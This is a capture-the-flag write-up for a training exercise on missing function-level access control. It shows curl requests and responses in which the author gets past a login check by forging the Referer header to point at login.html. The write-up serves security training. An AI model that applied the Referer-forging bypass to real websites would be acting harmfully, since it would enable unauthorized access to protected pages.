# A7 Missing Function Level Access Control

1.	By taking a look at the page' source, seems that the blue button labeled
	with `login` is a disabled link pointing to `login.html`. It could be a
	useful information...

2.	The page is looking for an already logged user. Let's take a look in the
	cookies

		$ curl -i http://ctf.infosecinstitute.com/ctf2/exercises/ex5.php
		HTTP/1.1 200 OK
		Date: Wed, 09 Sep 2015 11:27:27 GMT
		Server: Apache/2.4.7 (Ubuntu)
		X-Powered-By: PHP/5.5.9-1ubuntu4.6
		Set-Cookie: PHPSESSID=t3opf9hu70le3b5ibje0s39ih1; path=/
		Expires: Thu, 19 Nov 1981 08:52:00 GMT
		Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
		Pragma: no-cache
		Vary: Accept-Encoding
		Content-Length: 4481
		Content-Type: text/html

		<!doctype html>
		<html lang="en">
		<head>
			<meta charset="UTF-8">
			<title>Practical Website Hacking - Exercise 5</title>
			<link href='http://fonts.googleapis.com/css?family=Abel|Open+Sans+Condensed:300|Chewy' rel='stylesheet' type='text/css'>

		[...]

	Nothing interesting...

3.	According to the task's description, users require to be logged in before
	viewing the page. Maybe the `login.html` could help us. Let's try with the
	`referer` HTTP header.

		$ curl -i --referer login.html http://ctf.infosecinstitute.com/ctf2/exercises/ex5.php
		HTTP/1.1 200 OK
		Date: Wed, 09 Sep 2015 11:38:55 GMT
		Server: Apache/2.4.7 (Ubuntu)
		X-Powered-By: PHP/5.5.9-1ubuntu4.6
		Set-Cookie: PHPSESSID=b8g0a76t05vmdgrsvl5osc1c50; path=/
		Expires: Thu, 19 Nov 1981 08:52:00 GMT
		Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
		Pragma: no-cache
		Vary: Accept-Encoding
		Content-Length: 4481
		Content-Type: text/html

		[...]

			<div class="panel panel-default">
				<div class="panel-body text-center">
					<p class="lead">You are not logged in. Please <a class="btn btn-sm btn-info" disabled href="login.html">login</a> to access this page.</p>
				</div>
			</div>

		[...]

	Grrr!!! Let's try with

		$ curl -i --referer http://ctf.infosecinstitute.com/ctf2/exercises/login.html http://ctf.infosecinstitute.com/ctf2/exercises/ex5.php
		HTTP/1.1 200 OK
		Date: Wed, 09 Sep 2015 11:42:43 GMT
		Server: Apache/2.4.7 (Ubuntu)
		X-Powered-By: PHP/5.5.9-1ubuntu4.6
		Set-Cookie: PHPSESSID=kjvtjlcdjsgn9qgb84u8iq25m4; path=/
		Expires: Thu, 19 Nov 1981 08:52:00 GMT
		Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
		Pragma: no-cache
		Vary: Accept-Encoding
		Content-Length: 4252
		Content-Type: text/html

		[...]

				<div class="alert alert-success col-md-4 col-md-offset-4">
					<p class="lead">Gosh, you were fast. You completed Level 5. You will be redirected to level 6 in 10 seconds.</p>
				</div>

		[...]

	Nice!!!

[Go to Ex4](./ex4.md) | [Go to Ex6] (./ex6.md)

